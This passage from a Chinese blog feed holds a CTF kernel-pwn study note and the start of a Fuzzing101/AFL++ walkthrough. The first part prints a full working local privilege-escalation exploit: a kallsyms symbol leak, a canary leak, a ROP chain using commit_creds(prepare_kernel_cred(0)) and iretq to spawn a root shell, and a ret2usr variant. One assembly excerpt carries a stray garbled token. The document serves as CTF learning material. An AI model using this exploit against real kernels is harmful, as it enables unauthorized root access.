strstr() 返回字符串出现的第一次位置</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);		<span class="comment">// 从 buf 中复制16个字节到 hex 中</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);		<span class="comment">// 将 hex 中的数据以十六进制的形式写入 commit_creds 全局变量</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 同上处理方式</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考虑问题2：首先需要明白Linux是如何处理内核态和用户态之间的切换，参考wiki的讲解：</p>
<ul>
<li><p>用户态切换为内核态：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 首先通过 swapgs 指令切换GS段寄存器 */</span></span><br><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span> </span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>内核态切换为用户态：</p>
<ul>
<li><p>通过<code>swapgs</code>指令切换GS段寄存器</p>
</li>
<li><p>通过<code>iretq</code>恢复用户态的相关信息，恢复主要的五个寄存器就可以成功返回用户态</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span> </span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>注意这里寄存器压栈的顺序，越晚压入的寄存器存在于栈的低地址，所以我们在构造ROP的时候需要先从rip开始构造。</p>
<p>这里学习一下wiki的脚本：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在用户态保存相关寄存器的值</span></span><br><span class="line"><span class="comment">// 在编译的时候由于存在汇编，需要加上 -masm=intel</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span>		<span class="comment">// 将标志寄存器压入栈</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// rop链</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br></pre></td></tr></table></figure>

<p>这里第二段汇编<code>call</code>指令首先会将下一条的指令给压入栈，所以需要进行一步<code>pop</code>操作。</p>
<p>相关栈帧如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230118184935460.png" alt="image-20230118184935460"></p>
<p>考虑问题3：在源码中发现off变量没有进行设置，导致canary的泄露。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;		<span class="comment">// vul</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过设置特定的off，便可以在<code>core_read()</code>函数中读取canary，相关栈帧如下：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230118181621574.png" alt="image-20230118181621574"></p>
<p>虽然没有用户态调试那么方便，但是我们根据上下文也能看出来canary的值是<code>0x6e9a6b8a53fd6f00</code>。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>刚开始学习内核，脚本能力还需要提高，这里就参考wiki上的exp。</p>
<p><del>Python写多了C基本都忘光了</del></p>
<blockquote>
<p>wiki链接：<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/">Kernel ROP - CTF Wiki (ctf-wiki.org)</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now uid : %d\n&quot;</span>, getuid());</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Kernel-ret2usr"><a href="#Kernel-ret2usr" class="headerlink" title="Kernel ret2usr"></a>Kernel ret2usr</h2><p>利用了内核态的高权限访问用户态的代码实现攻击。与ROP相比，利用方式更加便捷。</p>
<p>学习一下wiki的相关脚本。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">    <span class="comment">/* puts(&quot;[*] root now.&quot;); */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// rop构造</span></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">8</span>] = canary ; </span><br><span class="line">    rop[<span class="number">10</span>] = (<span class="type">size_t</span>)get_root;		<span class="comment">// 执行用户态的代码</span></span><br><span class="line">    rop[<span class="number">11</span>] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[<span class="number">12</span>] = <span class="number">0</span>;</span><br><span class="line">    rop[<span class="number">13</span>] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[<span class="number">14</span>] = (<span class="type">size_t</span>)get_shell; </span><br><span class="line">    rop[<span class="number">15</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">16</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">17</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">18</span>] = user_ss;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>













]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzing101 学习笔记</title>
    <url>/2023/01/13/Pwn/Fuzzing101/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过对<code>Fuzzing101</code>项目的学习，逐步深入了解模糊测试，掌握工具的安装与使用，以及模糊测试结果的分析和调试。本文是在作者学习<code>fuzz</code>源码之后所写，根据项目中每一篇挑战的<code>Readme.md</code>进行翻译和学习，并参考了网上师傅们的文章。在这里，特别感谢<code>hollk</code>师傅的文章和指导，希望详细学习模糊测试的读者请查看<code>hollk</code>师傅的博客：<a href="https://blog.csdn.net/qq_41202237?type=blog">hollk的博客_CSDN博客-pwn,模糊测试,堆溢出领域博主</a></p>
<p>项目搭建：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/antonio-morales/Fuzzing101</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="Exercise-1：Xpdf"><a href="#Exercise-1：Xpdf" class="headerlink" title="Exercise 1：Xpdf"></a>Exercise 1：Xpdf</h2><p>CVE-2019-13288：<code>Parser.cc</code>源码中的<code>Parser::getObj()</code>函数可能会产生无限递归导致程序崩溃。</p>
<blockquote>
<p>原文链接：<a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288 : In Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite recursion via a crafted file. A remote at (cvedetails.com)</a></p>
</blockquote>
<h3 id="Fuzz准备"><a href="#Fuzz准备" class="headerlink" title="Fuzz准备"></a>Fuzz准备</h3><p>搭建<code>Xpdf</code>环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">相关依赖</span></span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt update &amp;&amp; sudo apt install -y build-essential gcc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Download Xpdf 3.02</span></span><br><span class="line">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz</span><br><span class="line">tar -xvzf xpdf-3.02.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Download PDF examples to <span class="built_in">test</span> Xpdf</span></span><br><span class="line">cd $HOME/fuzzing_xpdf</span><br><span class="line">mkdir pdf_examples &amp;&amp; cd pdf_examples</span><br><span class="line">wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf</span><br><span class="line">wget http://www.africau.edu/images/default/sample.pdf</span><br><span class="line">wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Build Xpdf</span></span><br><span class="line">cd xpdf-3.02</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p>测试<code>Xpdf</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdfinfo -box -meta <span class="variable">$HOME</span>/fuzzing_xpdf/pdf_examples/helloworld.pdf</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果如下，说明测试成功</span></span><br><span class="line">Tagged:         no</span><br><span class="line">Pages:          1</span><br><span class="line">Encrypted:      no</span><br><span class="line">Page size:      200 x 200 pts</span><br><span class="line">MediaBox:           0.00     0.00   200.00   200.00</span><br><span class="line">CropBox:            0.00     0.00   200.00   200.00</span><br><span class="line">BleedBox:           0.00     0.00   200.00   200.00</span><br><span class="line">TrimBox:            0.00     0.00   200.00   200.00</span><br><span class="line">ArtBox:             0.00     0.00   200.00   200.00</span><br><span class="line">File size:      678 bytes</span><br><span class="line">Optimized:      no</span><br><span class="line">PDF version:    1.7</span><br></pre></td></tr></table></figure>

<p>搭建<code>Fuzz</code>环境：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">相关依赖</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools</span><br><span class="line">sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang </span><br><span class="line">sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-dev</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搭建 Fuzz</span></span><br><span class="line">cd $HOME</span><br><span class="line">git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">make distrib</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>使用<code>afl-clang-fast</code>对<code>Xpdf</code>进行插桩：</p>
